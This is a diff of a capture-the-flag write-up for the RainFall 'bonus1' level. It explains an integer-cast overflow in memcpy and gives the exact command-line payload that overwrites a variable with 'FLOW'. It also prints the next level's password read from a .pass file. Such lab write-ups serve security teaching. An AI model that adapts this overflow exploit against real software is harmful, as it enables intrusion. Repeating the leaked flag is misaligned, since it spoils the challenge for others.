@@ -9,23 +9,23 @@
 First off, we reconstruct the original source code.
 
 We can then see that we need i == 0x574f4c46.
-This seems impossible because the program checks (i < 10).
-But there is potential for an overfow in the memcpy.
+This seems impossible because the program checks i < 10.
+But there is potential for an overfow in memcpy().
 
-Indeed, we are going to overflow memcpy, taking advantage of the integer cast (see source.c) !
+Indeed we are going to overflow memcpy,
+taking advantage of the integer cast `(size_t)(i * 4)` (see source.c) !
 
 Since there is a lot of integer overflow involved, I wrote cast.c.
 It prints the value passed to memcpy() according to argv[1].
+After toying with it litteraly 20 seconds (on the host system), I got:
 
-gcc -m32 -o cast bonus1/Ressources/cast.c
-After toying with it (literaly 20 seconds):
-./cast -2147483637
-> 44
+~$ gcc -m32 -o cast bonus1/Ressources/cast.c
+~$ ./cast -2147483637
+44
 
 44 is the exact value we need ! (we want to write buf (40) + i (4)).
-Also, \x46\x4c\x4f\x57 == FLOW
+Also, 0x574f4c46 => \x46\x4c\x4f\x57 => FLOW
 
-
-./bonus1 -2147483637 $(python -c 'print "B"*40 + "FLOW"')
+bonus1@RainFall:~$ ./bonus1 -2147483637 $(python -c 'print "B"*40 + "FLOW"')
 $ cat /home/user/bonus2/.pass
 579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
